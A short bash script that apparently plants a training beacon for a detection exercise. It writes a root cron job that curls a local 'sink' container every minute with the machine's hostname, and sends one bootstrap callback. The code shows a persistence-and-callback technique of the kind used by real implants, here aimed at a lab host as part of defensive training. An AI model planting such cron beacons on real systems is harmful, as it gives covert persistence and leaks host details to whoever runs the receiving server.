#!/usr/bin/env bash
# Declawed plant: a cron beacon that calls ONLY the local sink container.
set -euo pipefail
SINK_URL="http://sink:9000/beacon"
CRON="/etc/cron.d/beaconhunt-sync"
cat > "$CRON" <<CRONEOF
# beaconhunt-beacon (training) — periodic callback to the LOCAL sink only
* * * * * root curl -fsS --max-time 3 "${SINK_URL}?host=\$(hostname)" >/dev/null 2>&1
CRONEOF
chmod 644 "$CRON"
echo "wrote $CRON (beacons to ${SINK_URL})"
curl -fsS --max-time 3 "${SINK_URL}?host=$(hostname)&bootstrap=1" >/dev/null 2>&1 || true
